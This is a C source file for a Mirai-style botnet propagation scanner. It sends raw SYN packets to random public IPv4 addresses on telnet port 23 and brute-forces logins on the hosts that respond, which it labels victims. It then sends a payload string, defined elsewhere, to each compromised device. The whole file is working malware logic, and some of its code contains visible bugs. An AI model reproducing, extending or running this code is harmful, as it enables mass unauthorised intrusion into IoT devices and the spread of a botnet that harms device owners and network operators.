#include "../include/main.h"

/*
	Okay so the original idea was to have a listening proc a sending proc and
	a recv proc. Then when it recv a client it would spawn a proc to deal with
	that client.

	Then I realized how weak the devices I'm aiming for are and just used a
	structure similar to mirai.

	Full disclosure: I'm not a coding and network god so mirais scanner is
	probably better (100% sure it is). I'm just doing this for fun :)
*/
port_t LOCAL_PORT; // Global source port
ipv4_t LOCAL_ADDR; // Global source port
struct scan_victim *victim_table;

bool scan_able = true;
bool scan_scanning = false;

void scan_init(void)
{
	int32_t ret;

	if ((ret = fork()) != 0)
		return; // We are parent or it failed, lets go home
	else // Child has spawned and we are the child
	{
		// if (proc_root()) // Make it check for root and stuff later
		if (scan_scanner() == false)
			scan_able = false;
		_exit(0);
	}
	return;
}

// Checksum calculator
// Only for use in this file
// Not mine!
static unsigned short csum(unsigned short *ptr, int nbytes)
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum = 0;
	while (nbytes > 1)
	{
		sum += *ptr++;
		nbytes -= 2;
	}
	if (nbytes == 1)
	{
		oddbyte = 0;
		*((u_char *)&oddbyte) = *(u_char *) ptr;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);
	answer = (short) ~sum;

	return (answer);
}

#define TELNET_DO 0xFD
#define TELNET_WONT 0xFC
#define TELNET_WILL 0xFB
#define TELNET_DONT 0xFE
#define TELNET_CMD 0xFF
#define TELNET_CMD_ECHO 1
#define TELNET_CMD_WINDOW_SIZE 31
 
bool scan_negotiate(int sock, unsigned char *buf, int len) {     
	if (buf[1] == TELNET_DO && buf[2] == TELNET_CMD_WINDOW_SIZE)
	{
		unsigned char tmp1[4] = {255, 251, 31};
		unsigned char tmp2[10] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

		if (send(sock, tmp1, 3, 0) < 0)
			return false;
		if (send(sock, tmp2, 9, 0) < 0)
			return false;

		return true;
	}
	 
	for (uint8_t i = 0; i < len; i++)
	{
		if (buf[i] == TELNET_DO)
			buf[i] = TELNET_WONT;
		else if (buf[i] == TELNET_WILL)
			buf[i] = TELNET_DO;
	}
	if (send(sock, buf, len, 0) < 0)
		return false;

	return true;
}

uint8_t scan_readuntil(const int32_t sock, const char **strs, const char **strs2)
{
	int16_t i = 0, maxlen = -1, minlen = -1;
	unsigned char *buf = NULL;

	while (*strs)
	{
		int16_t _len = strlen(*strs++);
		if (_len > maxlen)
			maxlen = _len;
		if (_len < minlen)
			minlen = _len;
	}
	while (*strs2)
	{
		int16_t _len = strlen(*strs2++);
		if (_len > maxlen)
			maxlen = _len;
		if (_len < minlen)
			minlen = _len;
	}

	unsigned char mbuf[maxlen + 100];

	while (1)
	{
		if (recv(sock, buf, 1, 0) < 0) // Read 1 from socket
			return 0;
		if (*buf == TELNET_CMD)
		{
			uint8_t longbuf[4];
			if (recv(sock, longbuf, 3, 0) <= 0)
				return 0;
			scan_negotiate(sock, longbuf, 3);
		}
		else
		{
			mbuf[i] = *buf;
		}
		if (i >= minlen)
		{
			while (*strs)
			{
				if (subcasestr((const char *)mbuf, *strs++) != -1)
					return 1;
			}
			while (*strs2)
			{
				if (subcasestr((const char *)mbuf, *strs2++) != -1)
					return 2;
			}
		}
		i++;
	}
	return 0;
}

bool scan_scanner(void)
{
	int32_t max = getdtablesize();
	printd("Maximum files open: %d", max)

	if (scan_able == false || scan_scanning == true)
		_exit(0);

	scan_scanning = true;
	printd("Initializing Scanner")

	victim_table = calloc(SCAN_SCANNER_MAXCON, sizeof(struct scan_victim));
	for (uint8_t i = 0; i < SCAN_SCANNER_MAXCON; i++)
	{
		victim_table[i].sock = -1;
	}

	int32_t sock, i = 1, n;
	uint16_t fails = 0;
	char datagram[200];
	zero(datagram, 200);

	// IP and TCP  structures
	struct iphdr *iph = (struct iphdr *) datagram;
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct ip));

	/* sockaddr struct and checksum struct */
	struct sockaddr_in addr;
	struct pseudo_header psh;

	if (ipv4_getinfo(&LOCAL_ADDR) == false)
		goto end;
	printd("Local info: %d %s", LOCAL_ADDR, ipv4_unpack(LOCAL_ADDR));

	// Set the random source port
	do
		LOCAL_PORT = rand();
	while (LOCAL_PORT < 1024); // make sure it isn't send below 1024 which is
	// reserved for root use only


	// Sockaddr header fillout
	addr.sin_family = AF_INET;

	// Pseudo header fillout
	psh.source_address = LOCAL_ADDR;
	psh.placeholder = 0;
	psh.protocol = 6; // TCP

	// IP header fillout
	iph->saddr = LOCAL_ADDR;
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0; // TOS = Type of service Can change QoS
	iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
	iph->id = htons(54321); // Id of this packet
	iph->frag_off = htons(16384);
	iph->ttl = 64; // TTL = TTL goes down onces for ever re-router it hits. If it hits 0 its discarded and icmp error sent
	iph->protocol = 6; // 6 = TCP

	// TCP header fillout
	tcph->source = htons(LOCAL_PORT);
	tcph->dest = htons(23); // Port 23 dest
	tcph->seq = htonl(1105024978);
	tcph->ack_seq = 0;
	tcph->doff = sizeof(struct tcphdr) / 4; // Size of tcp header
	tcph->fin = 0;
	tcph->syn = 1; // Syncronize packet to check if the port is open
	tcph->rst = 0; // No other should be checked
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->window = htons(14600); // Maximum allowed window size
	tcph->urg_ptr = 0;

	// Create a raw socket
	if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0)
	{
		printd("Failed to open raw socket");
		goto end;
	}

	if ((fcntl(sock, F_SETFL, O_NONBLOCK | fcntl(sock, F_GETFL, 0))) == -1)
	{
		printd("fcntl() failed to set O_NONBLOCK. Errno: %d | %s", errno, strerror(errno));
		goto end;
	}

	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) < 0)
	{
		printd("Failed to set IP_HDRINCL");
		goto end;
	}

	memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));

	while (1)
	{
		for (i = 0; i < SCAN_SCANNER_BURST; i++)
		{
			addr.sin_addr.s_addr = ipv4_random_public(); // It should already be a 32 bit uint
			iph->daddr = addr.sin_addr.s_addr;
			// Reset the checksums
			iph->check = 0;
			tcph->check = 0;

			// Set up the checksums
			psh.dest_address = addr.sin_addr.s_addr;
			psh.tcp_length = htons(sizeof(struct tcphdr));

			// memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));

			// Make the checksums
			iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
			tcph->check = csum((unsigned short *)&psh, sizeof(struct pseudo_header));

			// Send the packet
			if (sendto(sock, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&addr, sizeof(addr)) < 0)
			{
				if (++fails >= SCAN_SCANNER_ERRMAX)
				{
					printd("Fails has surpassed %d Resetting fail count", SCAN_SCANNER_ERRMAX);
					fails = 0;
				}
			}
		}
		i = 0;
		while (1)
		{
			unsigned char buf[1514];
			struct iphdr *riph = (struct iphdr *)buf;
            struct tcphdr *rtcph = (struct tcphdr *)(iph + 1);
			errno = 0;

			n = recvfrom(sock, buf, sizeof(buf), MSG_NOSIGNAL, NULL, NULL);
			if (n <= 0 /*|| errno == EAGAIN || errno == EWOULDBLOCK*/&& errno != 0)
				break;

			printf("%s->%s %d %d %d %d %d\n", ipv4_unpack(riph->saddr), ipv4_unpack(riph->daddr), riph->protocol, rtcph->syn, rtcph->ack, htons(rtcph->source), htons(rtcph->dest));

			if (riph->protocol != 6) // Packet needs to be TCP
				break;
			if (rtcph->syn != 1)
				break;
			if (rtcph->ack != 1)
				break;
			if (rtcph->source != htons(23))
				break;

			printd("Got a live one: %s flags: SYN %d ACK %d FIN %d", ipv4_unpack(riph->saddr), rtcph->syn, rtcph->ack,rtcph->fin);
			
			struct scan_victim *victim;
			victim = &victim_table[i];
			victim->ip = riph->saddr;
			victim->user = 0;
			victim->pass = 0;
			victim->tries = 0;
			victim->state = CONNECTING;
			if (i++ >= SCAN_SCANNER_MAXCON)
				break;
		}
		// printd("Moving to bruteforce");
		while (1)
		{
			if (i == 0) // if i was no incremented (no devices were found) we will move on
				break;
			
			struct sockaddr_in addrx;
			addrx.sin_family = AF_INET;
			addrx.sin_port = htons(23);
			memset(addrx.sin_zero, '\0', sizeof(addrx.sin_zero));

			struct timeval timeout;
			timeout.tv_sec = SCAN_SCANNER_SEC;
			timeout.tv_usec = SCAN_SCANNER_USEC;

			for (i = 0; i <= SCAN_SCANNER_MAXCON; i++)
			{
				switch(victim_table[i].state)
				{
					case CONNECTING:
					{
						addrx.sin_addr.s_addr = victim_table[i].ip;
						if ((victim_table[i].sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
						{
							victim_table[i].state = FINISHED;
							break;
						}
						setsockopt(victim_table[i].sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
						setsockopt(victim_table[i].sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
						fcntl(victim_table[i].sock, F_SETFL, fcntl(victim_table[i].sock, F_GETFL, NULL) | O_NONBLOCK);
						if(connect(victim_table[i].sock, (struct sockaddr *)&addrx, sizeof(addrx)) == -1 && errno != EINPROGRESS)
						{
							victim_table[i].state = FINISHED;
						}
						else
						{
							victim_table[i].state = USERNAME;
						}
						break;
					} 
					case USERNAME:
					{
						uint8_t x = scan_readuntil(victim_table[i].sock, userprompts, prompts);

						switch (x)
						{
							case 0:
								victim_table[i].state = FINISHED;
								break;
							case 1:
								break;
							case 2:
								victim_table[i].state = PAYLOAD;
						}
						if (send(victim_table[i].sock, usernames[victim_table[i].user], strlen(usernames[victim_table[i].user]), 0) == -1)
						{
							victim_table[i].state = FINISHED;
							break;
						}
						x = scan_readuntil(victim_table[i].sock, failstrs, passprompts);
						switch (x)
						{
							case 0:
								victim_table[i].state = FINISHED;
								break;
							case 1:
								if (victim_table[i].user++ >= usersize)
									victim_table[i].state = FINISHED;
								break;
							case 2:
								victim_table[i].state = PASSWORD;
								break;
						}
						break;
					}
					case PASSWORD:
					{

						if (send(victim_table[i].sock, passwords[victim_table[i].pass], strlen(passwords[victim_table[i].pass]), 0) == -1)
						{
							victim_table[i].state = FINISHED;
							break;
						}

						uint8_t x = scan_readuntil(victim_table[i].sock, failstrs, prompts);
						switch (x)
						{
							case 0:
								victim_table[i].state = FINISHED;
								break;
							case 1:
								if (victim_table[i].pass++ >= passsize)
								{
									victim_table[i].pass = 0;
									if (victim_table[i].user++ >= usersize)
										victim_table[i].state = FINISHED;
									else
										victim_table[i].state = USERNAME;
								}
							case 2:
								victim_table[i].state = PAYLOAD;
						}
						break;
					}
					case PAYLOAD:
					{
						// I know this look stupid for now but I'll clean it up later
						if (send(victim_table[i].sock, SCAN_SCANNER_PAYLOAD, strlen(SCAN_SCANNER_PAYLOAD), 0) == -1)
							victim_table[i].state = FINISHED;
						victim_table[i].state = FINISHED;
						break;
					}
					case FINISHED:
					{
						break;
					}
				}
			}
		}
	}
end:
	scan_scanning = false;
	free(victim_table);
	_exit(0);
}
